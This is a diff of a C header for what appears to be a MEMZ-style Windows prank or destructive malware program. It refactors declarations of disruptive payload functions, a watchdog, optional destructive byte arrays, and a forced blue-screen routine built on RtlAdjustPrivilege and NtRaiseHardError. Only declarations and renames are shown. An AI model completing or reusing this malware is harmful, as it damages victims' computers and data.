@@ -1,3 +1,4 @@
+#pragma once
 /* Mode's:
 BSOD OFF, DESTRUCTIVE OFF
 BSOD ON,  DESTRUCTIVE OFF
@@ -29,16 +30,16 @@ typedef struct {
 extern PAYLOAD Payloads[];
 extern const size_t nPayloads;
 
-// Internal Structur Data
+// Internal Declaration
 #ifdef DESTRUCTIVE
 extern const unsigned char Code1[];
 extern const unsigned char Code2[];
-extern const size_t Code1Len;
-extern const size_t Code2Len;
+extern const size_t nCode1;
+extern const size_t nCode2;
 #endif  
 
 extern const wchar_t Note[];
-extern const size_t NoteLen;
+extern const size_t nNote;
 
 extern const wchar_t *Sites[];
 extern const size_t nSites;
@@ -51,7 +52,7 @@ extern const size_t nMsgs;
 
 extern int  argc, scrw, scrh;
 
-// NT Functions for KillWindowsInstant
+// NT Functions
 #ifdef BSOD
 EXTERN_C NTSTATUS NTAPI RtlAdjustPrivilege(ULONG Privilege, BOOLEAN Enable, BOOLEAN CurrentThread, PBOOLEAN OldValue);
 EXTERN_C NTSTATUS NTAPI NtRaiseHardError(LONG ErrorStatus, ULONG NumberOfParameters, ULONG UnicodeStringParameterMask, PULONG_PTR Parameters, ULONG ValidResponseOptions, PULONG Response);
@@ -60,29 +61,29 @@ EXTERN_C NTSTATUS NTAPI NtRaiseHardError(LONG ErrorStatus, ULONG NumberOfParamet
 // Internal Functions
 /// Payloads
 DWORD WINAPI PayloadThread(LPVOID lpParameter);
-int PayloadExecute(PAYLOADFUNC);
-int PayloadCursor(PAYLOADFUNC);
-int PayloadKeyboard(PAYLOADFUNC);
-int PayloadSound(PAYLOADFUNC);
-int PayloadBlink(PAYLOADFUNC);
-int PayloadMessageBox(PAYLOADFUNC);
-int PayloadDrawErrors(PAYLOADFUNC);
-int PayloadChangeText(PAYLOADFUNC);
-int PayloadPIP(PAYLOADFUNC);
-int PayloadPuzzle(PAYLOADFUNC);
+INT PayloadExecute(PAYLOADFUNC);
+INT PayloadCursor(PAYLOADFUNC);
+INT PayloadKeyboard(PAYLOADFUNC);
+INT PayloadSound(PAYLOADFUNC);
+INT PayloadBlink(PAYLOADFUNC);
+INT PayloadMessageBox(PAYLOADFUNC);
+INT PayloadDrawErrors(PAYLOADFUNC);
+INT PayloadChangeText(PAYLOADFUNC);
+INT PayloadPIP(PAYLOADFUNC);
+INT PayloadPuzzle(PAYLOADFUNC);
 
 /// Utils
-int Random();
+INT Random();
 LRESULT CALLBACK MsgBoxHook(int nCode, WPARAM wParam, LPARAM lParam);
 DWORD WINAPI MessageBoxThread(LPVOID lpParameter);
 DWORD WINAPI RipMessageThread(LPVOID lpParameter);
-void StrReverse(LPWSTR str);
-BOOL CALLBACK EnumChildProc(HWND hwnd, LPARAM lParam);
-void KillWindows();
+VOID StrReverse(LPWSTR str);
+BOOL CALLBACK EnumChildProc(HWND hWnd, LPARAM lParam);
+VOID KillWindows();
 #ifdef BSOD
-void KillWindowsInstant();
+VOID KillWindowsInstant();
 #endif
 
 /// WatchDog
 DWORD WINAPI WatchDogThread(LPVOID lpParameter);
-LRESULT CALLBACK WindowProc(HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM lParam);
+LRESULT CALLBACK WindowProc(HWND hWnd, UINT uMsg, WPARAM wParam, LPARAM lParam);
